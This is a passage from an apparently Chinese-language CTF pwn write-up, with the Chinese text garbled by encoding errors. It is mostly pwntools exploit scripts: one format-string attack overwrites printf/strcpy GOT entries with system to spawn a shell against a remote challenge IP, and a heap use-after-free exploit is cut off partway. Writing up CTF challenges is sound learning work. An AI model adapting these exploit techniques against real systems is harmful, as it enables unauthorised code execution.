number">0b11000000</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> strarg<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 

    <span class="token keyword">def</span> <span class="token function">attach</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token punctuation">:</span>
        ru<span class="token punctuation">(</span><span class="token string">"choice:\n"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">" encode:\n"</span><span class="token punctuation">)</span>
        s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">"your choice:\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"keys?\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"your message to encode:\n"</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x150</span><span class="token punctuation">)</span>    
    
    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%55$p-%51$p-%11$p"</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
    __libc_start_main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">240</span>
    ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
    codebase <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xe5b</span>
    ru<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
    stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xe0</span>
    ret_stack <span class="token operator">=</span> stack <span class="token operator">+</span><span class="token number">0x8</span>
    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">,</span>__libc_start_main<span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> __libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">)</span>
    
    printf_got <span class="token operator">=</span> codebase <span class="token operator">+</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
    
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>

    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c%14$hhn"</span><span class="token punctuation">)</span>
    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%22$hhn"</span><span class="token punctuation">)</span>
    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    
    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>stack<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%14$hhn"</span><span class="token punctuation">)</span>
    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%22$hn"</span><span class="token punctuation">)</span>
    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>  

    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%54$hhn"</span><span class="token punctuation">)</span>
    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%22$hhn"</span><span class="token punctuation">)</span>
    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>  <span class="token comment">#è¿™ä¹‹åå°±æ–­æ‰äº†ã€‚</span>

    pl <span class="token operator">=</span> choice2encode<span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span><span class="token string">"%54$hn"</span><span class="token punctuation">)</span>
    attach<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>   
    sl<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">" encode:\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>

    lg<span class="token punctuation">(</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">,</span>__libc_start_main<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"codebase"</span><span class="token punctuation">,</span>codebase<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"stack"</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"printf_got"</span><span class="token punctuation">,</span>printf_got<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span>system<span class="token punctuation">)</span>
    <span class="token comment"># gdb()</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>ä¸‹é¢æ˜¯èƒ½æ‰“é€šçš„wpï¼Œä½†æˆ‘è¿˜æ˜¯æ„Ÿè§‰å¾ˆå¥‡æ€ªã€‚å› ä¸ºå®ƒæ˜¯ä¿®æ”¹çš„strcpy_gotçš„ã€‚è€Œä¸”æ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„æ”¹ã€‚</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"114.67.175.224"</span><span class="token punctuation">,</span><span class="token number">11441</span><span class="token punctuation">)</span>

elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>

<span class="token comment">#encode2çš„é€†ç®—æ³•</span>
<span class="token keyword">def</span> <span class="token function">choice2encode</span><span class="token punctuation">(</span>strarg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11111100</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> strarg<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#encode3çš„é€†ç®—æ³•</span>
<span class="token keyword">def</span> <span class="token function">choice3encode</span><span class="token punctuation">(</span>strarg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b00111111</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11000000</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> strarg<span class="token punctuation">]</span><span class="token punctuation">)</span>


p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'keys?'</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x148</span><span class="token punctuation">)</span> 

p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%55$p%51$p%14$p'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>   
libc_start_main<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">240</span>

<span class="token comment">#libc_base</span>
libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">,</span> libc_start_main<span class="token punctuation">)</span>
libc_base<span class="token operator">=</span>libc_start_main<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>   <span class="token comment">#libcåŸºå€</span>
<span class="token comment">#main_base</span>
main_base<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xe5b</span>
<span class="token comment">#stack_addr</span>
stack_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">'leak->libc_base'</span> <span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">'leak->mainbase'</span> <span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string">'leak->stack_addr'</span> <span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
strcpy_got<span class="token operator">=</span>main_base<span class="token operator">+</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strcpy'</span><span class="token punctuation">]</span><span class="token comment">#elfçš„åŸºåœ°å€  </span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'strcpyGOT'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>strcpy_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_system<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment">#æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç¬¬ä¸€æ­¥</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'first'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    x <span class="token operator">=</span> <span class="token number">5</span><span class="token operator">-</span>i
    off_lowByte<span class="token operator">=</span><span class="token punctuation">(</span>stack_addr<span class="token operator">+</span><span class="token number">32</span><span class="token operator">+</span>x<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off_lowByte<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%14$hhn'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

    value_lowByte <span class="token operator">=</span> <span class="token punctuation">(</span>strcpy_got<span class="token operator">>></span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>value_lowByte<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%50$hhn'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
  
<span class="token comment">#æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç¬¬äºŒæ­¥</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'second'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    off_lowByte<span class="token operator">=</span><span class="token punctuation">(</span>strcpy_got<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off_lowByte<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%50$hhn'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
  
    value_lowByte <span class="token operator">=</span> <span class="token punctuation">(</span>libc_system<span class="token operator">>></span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    payload<span class="token operator">=</span>choice2encode<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>value_lowByte<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%54$hhn'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

<span class="token comment">#æ‰§è¡Œsystem('/bin/sh')</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>choice3encode<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è‡³äºä»–ä¸ºä»€ä¹ˆä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è¯¥æ˜¯å› ä¸ºè¿™ä¸¤ä¸ªçš„åœ°å€å‡ ä¹ä¸ä¸€æ ·ã€‚æ‰€ä»¥æˆ‘æ„Ÿè§‰å¾ˆé¸¡è‚‹ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/21/mnkhaOW2o8JAlxr.png" alt="83a94331d7407a047f0484393068af91.png"></p>
<h5 id="Baby-heap2"><a href="#Baby-heap2" class="headerlink" title="Baby-heap2"></a>Baby-heap2</h5><p>è¿™é¢˜å°±æœ‰æ„æ€äº†ï¼Œé¢˜ç›®ç»™çš„æè¿°æ˜¯2.31ç»“æœä¸‹é¢éƒ½è¯´æ˜¯2.27ã€‚ç„¶åæˆ‘ç”¨2.27å¾—åˆ°çš„libc_baseæ‰æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯è¿œç¨‹ä¹Ÿæ˜¯æ‰“ä¸é€šçš„ã€‚æœ¬åœ°éƒ½é€šäº†ã€‚</p>
<p>è¿™é¢˜å’Œä¹‹å‰å“ªä¸€é¢˜é€»è¾‘ä¸€æ ·ï¼Œåªä¸è¿‡ä¸æ˜¯å †æº¢å‡ºäº†ï¼Œæ”¹æˆäº†uafã€‚æŠŠtcacheå¡«æ»¡ï¼Œåœ¨ç”³è¯·ä¸€ä¸ª0x80çš„chunkï¼Œæ”¾åˆ°unsortedbiné‡Œé¢å°±å¯ä»¥æ³„éœ²å‡ºæ¥ä¿¡æ¯ï¼ˆuafï¼‰ã€‚ä¹‹åå°±æ˜¯æ­£å¸¸ï¼Œå½“æ—¶è¿œç¨‹æ‰“ä¸é€šï¼Œæˆ‘ä»¥ä¸ºæ˜¯æˆ‘çš„æ–¹æ³•é—®é¢˜ç”¨äº†ä¸¤ç§æ–¹æ³•ä¸€ä¸ªæ˜¯è¯¥free_hookè¿˜æœ‰ä¸€ä¸ªæ˜¯ç”¨reallocè°ƒèŠ‚æ ˆå¸§ä¹‹åoogã€‚æœ¬åœ°éƒ½é€šäº†ã€‚ä»¥ä¸‹æ˜¯æˆ‘ç”¨çš„libcï¼Œä¹Ÿæ˜¯è¿œç¨‹ç¯å¢ƒçš„ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/21/t8PMmn4IEq53wKp.png" alt="13c3d7435fd96f2a43a5055770c0fae9.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ç”¨reallocè°ƒèŠ‚æ ˆå¸§ä¹‹åoog</span>
<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    <span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
        ru<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
        s<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token comment">#heap - 0x4080</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#0</span>
    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#1</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#2</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#3-9</span>
        add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>
    
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span>
